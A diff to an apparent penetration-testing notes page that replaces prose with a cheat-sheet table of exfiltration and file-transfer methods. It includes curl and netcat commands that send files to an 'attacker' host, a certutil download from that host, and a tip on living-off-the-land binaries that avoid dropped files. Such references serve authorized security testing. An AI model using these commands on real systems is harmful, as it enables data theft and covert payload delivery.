@@ -1,6 +1,14 @@
-## File Transfer Techniques for Data Exfiltration
+| Method | When to use |
+|---|---|
+| `python3 -m http.server` | Fastest for pulling files to attacker from Linux target |
+| `impacket-smbserver share .` | Windows targets — mount as a drive letter |
+| `curl -T file http://attacker/upload` | Pushing files to attacker-controlled server |
+| `nc -w3 attacker 4444 < file` | Simple, no dependencies |
+| Certutil (Windows) | `certutil -urlcache -split -f http://attacker/file out` |
+| DNS exfil | When only port 53 outbound is allowed |
 
-Transferring files during an engagement is critical for moving payloads, extracting sensitive data, or exfiltrating credentials. The choice of technique depends on available protocols, firewall restrictions, and stealth requirements.
+!!! tip "Tip"
+    For Windows file transfers, `certutil` and `bitsadmin` are LOLBins — no dropped binaries. `certutil -urlcache -split -f <url> <output>` works on most Windows versions.
 
 ### Using Netcat for File Transfers
 
